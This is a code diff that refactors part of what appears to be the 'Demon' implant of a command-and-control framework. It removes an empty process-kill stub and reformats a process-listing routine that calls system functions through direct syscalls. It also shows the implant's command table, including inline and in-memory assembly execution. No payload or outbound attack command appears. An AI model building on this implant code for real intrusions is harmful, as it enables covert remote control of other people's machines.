@@ -22,7 +22,6 @@ DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_JOB,                      .Function = CommandJob                      },
         { .ID = DEMON_COMMAND_PROC,                     .Function = CommandProc                     },
         { .ID = DEMON_COMMAND_PROC_LIST,                .Function = CommandProcList                 },
-        { .ID = DEMON_COMMAND_PROC_KILL,                .Function = CommandProcKill                 },
         { .ID = DEMON_COMMAND_FS,                       .Function = CommandFS                       },
         { .ID = DEMON_COMMAND_INLINE_EXECUTE,           .Function = CommandInlineExecute            },
         { .ID = DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE,  .Function = CommandAssemblyInlineExecute    },
@@ -550,15 +549,14 @@ VOID CommandProcList( PPARSER Parser )
             ListSize               += Required;
             ProcessInformationList =  Instance->Win32.LocalAlloc( LPTR, ListSize );
 
-	    if ( ProcessInformationList != NULL )
-	    {
-        	NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &Required);
-            }
+            if ( ProcessInformationList != NULL )
+                NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &Required);
             else
             {
-        	PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
-            	goto LEAVE;
-       	    }
+                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+                goto LEAVE;
+            }
+
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "NtQuerySystemInformation: Failed" )
@@ -566,23 +564,23 @@ VOID CommandProcList( PPARSER Parser )
                 goto LEAVE;
             }
         }
-        if ( NtStatus == STATUS_INFO_LENGTH_MISMATCH ){
-        	
+
+        if ( NtStatus == STATUS_INFO_LENGTH_MISMATCH )
+        {
         	do
         	{
-		    Instance->Win32.LocalFree( ProcessInformationList );
+                Instance->Win32.LocalFree( ProcessInformationList );
 
-		    ListSize               += Required;
-		    ProcessInformationList =  Instance->Win32.LocalAlloc( LPTR, ListSize );
-		    if ( ProcessInformationList != NULL )
-		    {
-        	    	NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &Required);
-        	    }
-        	    else
-        	    {
-        	        PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
-            		goto LEAVE;
-        	    }
+                ListSize               += Required;
+                ProcessInformationList =  Instance->Win32.LocalAlloc( LPTR, ListSize );
+
+                if ( ProcessInformationList != NULL )
+                    NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &Required);
+                else
+                {
+                    PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+                    goto LEAVE;
+                }
         	}
         	while ( NtStatus == STATUS_INFO_LENGTH_MISMATCH );
         }
@@ -646,12 +644,6 @@ VOID CommandProcList( PPARSER Parser )
 
 LEAVE:
     PackageDestroy( Package );
-}
-
-// TODO: move this to the Proc Function Module
-VOID CommandProcKill( PPARSER DataArgs )
-{
-
 }
 
 VOID CommandFS( PPARSER DataArgs )
